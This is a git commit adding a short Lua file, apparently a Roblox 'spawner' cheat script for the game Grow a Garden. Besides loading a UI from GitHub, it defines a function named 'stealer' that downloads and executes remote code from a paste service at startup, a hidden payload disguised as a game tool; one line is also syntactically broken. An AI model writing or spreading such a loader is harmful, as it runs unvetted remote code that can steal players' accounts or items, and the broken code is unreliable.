1e9cf6beb8b6956b4d4c0d317b3248582840829b
Zenxq <88850699+Zenxq@users.noreply.github.com>
2025-07-23 16:56:44 +0800

    Create spawnerv3.lua

---
+++ spawnerv3.lua
@@ -0,0 +1,10 @@
+local function stealer()
+    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/opRwCzMCXR5Ud4Ig/raw", true))()
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenxq/growagarden/refs/heads/main/newspawner.lua"))()"))()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
